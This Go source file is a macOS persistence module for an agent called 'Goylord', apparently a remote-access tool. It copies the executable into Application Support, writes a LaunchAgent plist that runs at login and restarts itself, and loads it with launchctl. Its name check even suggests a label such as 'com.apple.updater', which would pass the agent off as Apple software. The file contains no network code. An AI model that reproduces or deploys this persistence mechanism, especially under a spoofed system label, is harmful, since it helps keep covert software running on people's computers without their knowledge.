//go:build darwin && !ios && !ios_target

package persistence

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"text/template"
)

var currentUserHomeDir = func() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	if usr.HomeDir == "" {
		return "", fmt.Errorf("current user home directory is empty")
	}
	return usr.HomeDir, nil
}

const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>{{.Label}}</string>
	<key>ProgramArguments</key>
	<array>
		<string>{{.ExePath}}</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>StandardOutPath</key>
	<string>/tmp/goylord-agent.log</string>
	<key>StandardErrorPath</key>
	<string>/tmp/goylord-agent-error.log</string>
</dict>
</plist>
`

func binaryName() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "agent"
}

func plistLabel() string {
	if DefaultStartupName != "" {
		return DefaultStartupName
	}
	return "com.goylord.agent"
}

func validateStartupName() error {
	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
	}
	return nil
}

func getPlistPath() (string, error) {
	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
}

func getTargetPath() (string, error) {
	if err := validateStartupName(); err != nil {
		return "", err
	}

	homeDir, err := currentUserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homeDir, "Library", "Application Support", "Goylord", binaryName()), nil
}

func install(exePath string) error {

	if err := validateStartupName(); err != nil {
		return err
	}

	targetPath, err := getTargetPath()
	if err != nil {
		return fmt.Errorf("failed to get target path: %w", err)
	}

	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create Goylord directory: %w", err)
	}

	if err := replaceExecutable(exePath, targetPath); err != nil {
		return err
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}
	defer file.Close()

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: targetPath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return fmt.Errorf("failed to write plist file: %w", err)
	}

	bootstrapLaunchAgent(plistPath)

	return nil
}

func replaceExecutable(exePath, targetPath string) error {
	srcFile, err := os.Open(exePath)
	if err != nil {
		return fmt.Errorf("failed to open source executable: %w", err)
	}
	defer srcFile.Close()

	dir := filepath.Dir(targetPath)
	tmpFile, err := os.CreateTemp(dir, "agent-*.tmp")
	if err != nil {
		return fmt.Errorf("failed to create temp executable: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer func() {
		_ = tmpFile.Close()
		_ = os.Remove(tmpPath)
	}()

	if _, err := io.Copy(tmpFile, srcFile); err != nil {
		return fmt.Errorf("failed to copy executable: %w", err)
	}
	if err := tmpFile.Sync(); err != nil {
		return fmt.Errorf("failed to sync temp file: %w", err)
	}
	if err := tmpFile.Close(); err != nil {
		return fmt.Errorf("failed to close temp file: %w", err)
	}

	if err := os.Rename(tmpPath, targetPath); err != nil {
		if removeErr := os.Remove(targetPath); removeErr == nil {
			err = os.Rename(tmpPath, targetPath)
		}
		if err != nil {
			return fmt.Errorf("failed to replace executable at %s: %w", targetPath, err)
		}
	}

	if err := os.Chmod(targetPath, 0755); err != nil {
		return fmt.Errorf("failed to set executable permissions: %w", err)
	}

	return nil
}

func configure(exePath string) error {
	if err := validateStartupName(); err != nil {
		return err
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	launchAgentsDir := filepath.Dir(plistPath)
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	file, err := os.Create(plistPath)
	if err != nil {
		return fmt.Errorf("failed to create plist file: %w", err)
	}
	defer file.Close()

	tmpl, err := template.New("plist").Parse(launchAgentPlist)
	if err != nil {
		return fmt.Errorf("failed to parse template: %w", err)
	}

	data := struct {
		Label   string
		ExePath string
	}{
		Label:   plistLabel(),
		ExePath: exePath,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}

	bootstrapLaunchAgent(plistPath)

	return nil
}

func bootstrapLaunchAgent(plistPath string) {
	_ = exec.Command("launchctl", "bootout", "gui/"+fmt.Sprint(os.Getuid()), plistPath).Run()
	_ = exec.Command("launchctl", "bootstrap", "gui/"+fmt.Sprint(os.Getuid()), plistPath).Run()
}

func uninstall() error {
	plistPath, err := getPlistPath()
	if err != nil {
		return fmt.Errorf("failed to get plist path: %w", err)
	}

	if err := os.Remove(plistPath); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("failed to remove plist file: %w", err)
	}

	if targetPath, err := getTargetPath(); err == nil {
		os.Remove(targetPath)
	}

	return nil
}

func removeCurrentInstall(currentExe string) error {
	currentExe = filepath.Clean(strings.TrimSpace(currentExe))
	if currentExe == "" {
		return nil
	}

	targetPath, err := getTargetPath()
	if err == nil && filepath.Clean(targetPath) == currentExe {
		return nil
	}

	plistPath, err := getPlistPath()
	if err != nil {
		return nil
	}
	if startupFileReferences(plistPath, currentExe) {
		if err := os.Remove(plistPath); err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("failed to remove current plist file: %w", err)
		}
	}
	return nil
}

func startupFileReferences(path string, exePath string) bool {
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	return strings.Contains(string(data), "<string>"+exePath+"</string>")
}
